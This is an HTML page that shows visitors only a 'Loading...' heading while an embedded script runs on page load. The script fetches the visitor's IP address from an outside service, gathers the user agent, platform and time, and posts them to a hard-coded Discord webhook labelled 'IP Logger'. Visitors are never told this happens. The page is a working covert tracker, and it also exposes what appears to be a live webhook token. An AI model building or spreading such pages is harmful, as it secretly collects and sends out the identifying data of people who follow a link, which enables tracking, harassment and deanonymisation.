<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: white;
            color: black;
            text-align: center;
            padding-top: 50px;
        }
    </style>
</head>
<body>
    <h1>Loading...</h1>

    <script>
        // Function to get IP and send to Discord
        async function logIP() {
            try {
                // Get IP address
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                
                // Additional info
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const timestamp = new Date().toISOString();
                
                // Send to Discord webhook
                const webhookURL = 'https://discord.com/api/webhooks/1399035671615770624/g1A644wWghVQ6TG4O8KUqPf-fnKpc-tz9zfOmL87F8O62cvFHau6RRixce898rnx0hF3';
                
                const payload = {
                    content: `New visitor:\nIP: ${ip}\nUser Agent: ${userAgent}\nPlatform: ${platform}\nTime: ${timestamp}`,
                    username: 'IP Logger',
                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/1791/1791961.png'
                };
                
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });
                
            } catch (error) {
                console.error('Error:', error);
            }
        }

        // Run the function when page loads
        window.onload = logIP;
    </script>
</body>
</html>
